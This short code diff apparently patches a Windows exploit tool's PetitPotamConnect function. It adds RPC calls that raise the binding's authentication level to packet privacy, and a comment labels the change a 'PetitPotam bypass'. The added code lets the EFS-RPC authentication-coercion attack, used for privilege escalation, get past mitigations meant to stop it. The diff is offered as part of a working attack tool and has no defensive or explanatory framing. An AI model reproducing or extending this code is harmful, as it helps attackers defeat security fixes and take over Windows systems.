@@ -239,6 +239,18 @@ void PetitPotamConnect(DWORD EfsID)
         return;
     }
 
+    // PetitPotam bypass via RPC_C_AUTHN_LEVEL_PKT_PRIVACY: https://github.com/zcgonvh/EfsPotato/pull/5
+    RpcStatus = RpcBindingSetAuthInfoW(binding_h, NetworkAddr, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, 0, RPC_C_AUTHZ_NONE);
+    if (RpcStatus != RPC_S_OK) {
+        printf("[-] RpcBindingSetAuthInfoW() Error: %i\n", GetLastError());
+        return;
+    }
+
+    RpcStatus = RpcBindingSetOption(binding_h, 12, 50000);
+    if (RpcStatus != RPC_S_OK) {
+        printf("[-] RpcBindingSetOption() Error: %i\n", GetLastError());
+        return;
+    }
 
     RpcStringFreeW(&StringBinding);
     if (RpcStatus != RPC_S_OK) {
